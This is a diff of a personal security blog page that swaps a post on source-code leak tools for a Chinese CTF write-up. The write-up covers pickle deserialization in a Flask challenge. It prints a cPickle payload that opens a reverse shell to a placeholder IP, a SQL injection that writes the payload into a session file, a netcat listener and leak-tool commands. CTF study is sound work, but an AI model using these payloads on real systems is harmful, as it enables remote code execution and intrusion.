@@ -108,25 +108,32 @@
 
 
 
-  <meta name="description" content="参考文献：https://www.jianshu.com/p/15b63d14781fGitHack地址https://blog.csdn.net/gitchat/article/details/79014538 GIT 源码泄露GitHack是一个.git泄露利用测试脚本，通过泄露的文件，还原重建工程源代码。工作原理  解析.git/index文件，找到工程中所有的： ( 文件名，文件sha1">
-<meta name="keywords" content="漏洞学习">
+  <meta name="description" content="参考文献：https://xz.aliyun.com/t/2219         http://120.77.209.122/index.php/archives/25/ 源码下载下来后，是基于flask框架，先查看路由文件routes.py，里面功能大部分是基于登陆的。 在others.py的最后有这样的内容 解题思路load()函数有一个unpkler函数用于反序列化参数(file)，如果f">
+<meta name="keywords" content="ctf记录">
 <meta property="og:type" content="article">
-<meta property="og:title" content="源码泄露总结">
-<meta property="og:url" content="https://cws6.github.io/2018/12/01/源码泄露总结/index.html">
+<meta property="og:title" content="复现强网杯python is the best language 2">
+<meta property="og:url" content="https://cws6.github.io/2018/04/09/复现强网杯python-is-the-best-language-2/index.html">
 <meta property="og:site_name" content="cws6">
-<meta property="og:description" content="参考文献：https://www.jianshu.com/p/15b63d14781fGitHack地址https://blog.csdn.net/gitchat/article/details/79014538 GIT 源码泄露GitHack是一个.git泄露利用测试脚本，通过泄露的文件，还原重建工程源代码。工作原理  解析.git/index文件，找到工程中所有的： ( 文件名，文件sha1">
+<meta property="og:description" content="参考文献：https://xz.aliyun.com/t/2219         http://120.77.209.122/index.php/archives/25/ 源码下载下来后，是基于flask框架，先查看路由文件routes.py，里面功能大部分是基于登陆的。 在others.py的最后有这样的内容 解题思路load()函数有一个unpkler函数用于反序列化参数(file)，如果f">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-12-02T10:33:02.060Z">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-c5cc31eaf48081bc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-b1f7302452cefd54.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-7a7b2b7a6ba254d2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-81db65b93c3fff5d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-602fa1af981204ad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-5772fda86decccce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-12-03T01:25:37.165Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="源码泄露总结">
-<meta name="twitter:description" content="参考文献：https://www.jianshu.com/p/15b63d14781fGitHack地址https://blog.csdn.net/gitchat/article/details/79014538 GIT 源码泄露GitHack是一个.git泄露利用测试脚本，通过泄露的文件，还原重建工程源代码。工作原理  解析.git/index文件，找到工程中所有的： ( 文件名，文件sha1">
+<meta name="twitter:title" content="复现强网杯python is the best language 2">
+<meta name="twitter:description" content="参考文献：https://xz.aliyun.com/t/2219         http://120.77.209.122/index.php/archives/25/ 源码下载下来后，是基于flask框架，先查看路由文件routes.py，里面功能大部分是基于登陆的。 在others.py的最后有这样的内容 解题思路load()函数有一个unpkler函数用于反序列化参数(file)，如果f">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/5035860-c5cc31eaf48081bc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 
 
 
 
 
 
-  <link rel="canonical" href="https://cws6.github.io/2018/12/01/源码泄露总结/">
+  <link rel="canonical" href="https://cws6.github.io/2018/04/09/复现强网杯python-is-the-best-language-2/">
 
 
 
@@ -136,7 +143,7 @@
   };
 </script>
 
-  <title>源码泄露总结 | cws6</title>
+  <title>复现强网杯python is the best language 2 | cws6</title>
   
 
 
@@ -323,7 +330,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://cws6.github.io/2018/12/01/源码泄露总结/">
+    <link itemprop="mainEntityOfPage" href="https://cws6.github.io/2018/04/09/复现强网杯python-is-the-best-language-2/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="cws6">
@@ -340,7 +347,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">源码泄露总结
+          <h1 class="post-title" itemprop="name headline">复现强网杯python is the best language 2
               
             
           </h1>
@@ -365,7 +372,7 @@
                 
               
 
-              <time title="Created: 2018-12-01 21:26:29" itemprop="dateCreated datePublished" datetime="2018-12-01T21:26:29+08:00">2018-12-01</time>
+              <time title="Created: 2018-04-09 20:12:35" itemprop="dateCreated datePublished" datetime="2018-04-09T20:12:35+08:00">2018-04-09</time>
             
 
             
@@ -382,7 +389,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2018-12-02 18:33:02" itemprop="dateModified" datetime="2018-12-02T18:33:02+08:00">2018-12-02</time>
+                <time title="Modified: 2018-12-03 09:25:37" itemprop="dateModified" datetime="2018-12-03T09:25:37+08:00">2018-12-03</time>
               
             
           </span>
@@ -415,23 +422,36 @@
       
 
       
-        <p>参考文献：<a href="https://www.jianshu.com/p/15b63d14781f" target="_blank" rel="noopener">https://www.jianshu.com/p/15b63d14781f</a><br><a href="https://link.jianshu.com/?t=https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">GitHack地址</a><br><a href="https://blog.csdn.net/gitchat/article/details/79014538" target="_blank" rel="noopener">https://blog.csdn.net/gitchat/article/details/79014538</a></p>
-<h4 id="GIT-源码泄露"><a href="#GIT-源码泄露" class="headerlink" title="GIT 源码泄露"></a>GIT 源码泄露</h4><p>GitHack是一个.git泄露利用测试脚本，通过泄露的文件，还原重建工程源代码。<br><strong>工作原理</strong></p>
+        <p>参考文献：<a href="https://xz.aliyun.com/t/2219" target="_blank" rel="noopener">https://xz.aliyun.com/t/2219</a><br>         <a href="http://120.77.209.122/index.php/archives/25/" target="_blank" rel="noopener">http://120.77.209.122/index.php/archives/25/</a></p>
+<p>源码下载下来后，是基于flask框架，先查看路由文件<em>routes.py</em>，里面功能大部分是基于登陆的。</p>
+<p>在<em>others.py</em>的最后有这样的内容<br><img src="https://upload-images.jianshu.io/upload_images/5035860-c5cc31eaf48081bc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"></p>
+<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p><code>load()函数</code>有一个<code>unpkler函数</code>用于反序列化参数(file)，如果file可控那么这就是一个反序列化漏洞。</p>
+<p>借用下大佬的payload，理解下这个。</p>
 <ul>
-<li>解析.git/index文件，找到工程中所有的： ( 文件名，文件sha1 )</li>
-<li>去.git/objects/ 文件夹下下载对应的文件</li>
-<li>zlib解压文件，按原始的目录结构写入源代码</li>
-<li>用法：<br><code>GitHack.py http://www.baidu.cn/.git/</code></li>
+<li><p>用下面的脚本(12.py)进行序列化payload的生成：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">from pickle import Pickler as Pkler</span><br><span class="line">import commands</span><br><span class="line">class hhh(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (os.system,(&quot;whoami&quot;,))</span><br><span class="line">evil = hhh()</span><br><span class="line"></span><br><span class="line">def dump(file):</span><br><span class="line">    pkler = Pkler(file)</span><br><span class="line">    pkler.dump(evil)</span><br><span class="line"></span><br><span class="line">with open(&quot;test&quot;,&quot;wb&quot;) as f:</span><br><span class="line">    dump(f)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>测试反序列化漏洞(13.py):</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pickle import Unpickler as Unpkler</span><br><span class="line">from io import open as Open</span><br><span class="line">def LOAD(file):</span><br><span class="line">    unpkler = Unpkler(file)</span><br><span class="line">    return Unpkler(file).load()</span><br><span class="line"></span><br><span class="line">with Open(&quot;test&quot;,&quot;rb&quot;) as f:</span><br><span class="line">    LOAD(f)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>执行<code>12.py</code>后，会在<code>12.py</code>的同级目录下生成<code>test</code>，执行<code>13.py</code>会显示出用户信息</p>
+</li>
 </ul>
-<h4 id="SVN-导致文件泄露"><a href="#SVN-导致文件泄露" class="headerlink" title="SVN 导致文件泄露"></a>SVN 导致文件泄露</h4><p>假如可以访问<code>http://www.baidu.com/.svn/entries</code>有内容，就可能存在<code>svn泄露</code><br>可以使用工具<code>dvcs-ripper</code>下载网站源码</p>
+<p><strong>全局搜索<code>load()函数</code>，发现它在<code>Mycache.py</code>的<code>FileSystemCache类</code>中有多次引用。（代码太长了，贴下有用的）</strong><br><img src="https://upload-images.jianshu.io/upload_images/5035860-b1f7302452cefd54.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"><br><strong>跟入_get_filename方法</strong><br><img src="https://upload-images.jianshu.io/upload_images/5035860-7a7b2b7a6ba254d2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"></p>
 <ul>
-<li><p>用法：<br><code>rip-svn.pl -v -u http://www.baidu.com/.svn/</code><br>####DS_Store 文件泄漏<br>假如可以访问<code>http://www.baidu.com/.ds_store</code>有内容，就可能存在<code>DS_store泄露</code><br>可以使用工具<code>dsstoreexp</code>，下载源代码</p>
-</li>
-<li><p>用法<br><code>ds_store_exp.py http://www.baidu.com/.ds_Store</code></p>
-</li>
+<li>可以看到将传入的字符串key进行MD5，并将其返回。通过全局搜索，发现在<code>Mysession.py</code>的<code>pen_session</code>中调用了key<br><img src="https://upload-images.jianshu.io/upload_images/5035860-81db65b93c3fff5d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"><br><img src="https://upload-images.jianshu.io/upload_images/5035860-602fa1af981204ad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></li>
 </ul>
-<h4 id="网站备份压缩文件"><a href="#网站备份压缩文件" class="headerlink" title="网站备份压缩文件"></a>网站备份压缩文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.rar    .zip   .7z    .tar.gz    .bak     .swp    .txt</span><br></pre></td></tr></table></figure>
-<h4 id="WEB-INF-web-xml-泄露"><a href="#WEB-INF-web-xml-泄露" class="headerlink" title="WEB-INF/web.xml 泄露"></a>WEB-INF/web.xml 泄露</h4><p>假如可以访问<code>http://www.baidu.com/WEB-INF/web.xml</code>查看配置文件</p>
+<p>其中<code>self.key_prefix</code>为<em>bdwsessions</em>，因此假设cookie中的sesssion值为pleated，则<code>self.key_prefix + sid</code>即为<em>bdwsessionspleated</em>，然后这串字符串进行MD5得到的结果<code>0ab5423aafb316e9c299e0bb853d0c11</code>。这样就可以控制file了。</p>
+<h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><ul>
+<li>①本地生成序列化文件，并且进行十六进制编码</li>
+<li>②通过第一关的sql注入，将本地生成的payload,写入服务器上的session文件，指定文件名为<code>MD5(bdwsessionspleated)</code>,这样我们在访问/index的时候把cookie中的session值改为pleated，触发<em>open_session</em>中的<em>self.cache.get</em>就可以进行反序列化攻击了</li>
+</ul>
+<p><strong>沙箱逃逸</strong><br>源码还设置了沙箱/黑名单来防止某些函数的执行，比如前面的os.system就被禁用了<br><img src="https://upload-images.jianshu.io/upload_images/5035860-5772fda86decccce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"><br>此处过滤了大多数函数，但是<code>commands.getoutput和subprocess.Popen()</code>并没有过滤,payload用的是<code>commands.getoutput</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import cPickle</span><br><span class="line">import commands</span><br><span class="line"></span><br><span class="line">class Exp(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (commands.getoutput,(&quot;python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;yourip\&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&apos;&quot;,)) </span><br><span class="line">e = Exp()</span><br><span class="line">poc = cPickle.dumps(e)</span><br><span class="line">print  &apos;0x&apos;+poc.encode(&apos;hex&apos;)</span><br></pre></td></tr></table></figure>
+<p>在注册的邮箱处填入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test12&apos;/**/union/**/select/**/0x63636f....../**/into/**/dumpfile/**/&apos;/tmp/ffff/0ab5423aafb316e9c299e0bb853d0c11&apos;#@test12.com</span><br></pre></td></tr></table></figure></p>
+<p>注册后出现Please use a different email address.。说明写入成功<br>然后访问<code>http://39.107.32.29/:20000/index</code><br>抓包修改session值为pleated</p>
+<p>反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 8181 -vvv</span><br></pre></td></tr></table></figure></p>
+<p>查看flag即可。</p>
 
       
     </div>
@@ -464,7 +484,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/漏洞学习/" rel="tag"># 漏洞学习</a>
+            <a href="/tags/ctf记录/" rel="tag"># ctf记录</a>
           
         </div>
       
@@ -477,8 +497,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/04/09/复现强网杯python-is-the-best-language-2/" rel="next" title="复现强网杯python is the best language 2">
-                <i class="fa fa-chevron-left"></i> 复现强网杯python is the best language 2
+              <a href="/2018/02/08/mysql提权/" rel="next" title="mysql提权">
+                <i class="fa fa-chevron-left"></i> mysql提权
               </a>
             
           </div>
@@ -487,8 +507,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/12/02/empire入门/" rel="prev" title="empire入门">
-                empire入门 <i class="fa fa-chevron-right"></i>
+              <a href="/2018/12/01/源码泄露总结/" rel="prev" title="源码泄露总结">
+                源码泄露总结 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -619,7 +639,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#GIT-源码泄露"><span class="nav-number">1.</span> <span class="nav-text">GIT 源码泄露</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SVN-导致文件泄露"><span class="nav-number">2.</span> <span class="nav-text">SVN 导致文件泄露</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#网站备份压缩文件"><span class="nav-number">3.</span> <span class="nav-text">网站备份压缩文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WEB-INF-web-xml-泄露"><span class="nav-number">4.</span> <span class="nav-text">WEB-INF/web.xml 泄露</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#解题思路"><span class="nav-number">1.</span> <span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#攻击流程"><span class="nav-number">2.</span> <span class="nav-text">攻击流程</span></a></li></ol></div>
             
 
           </div>
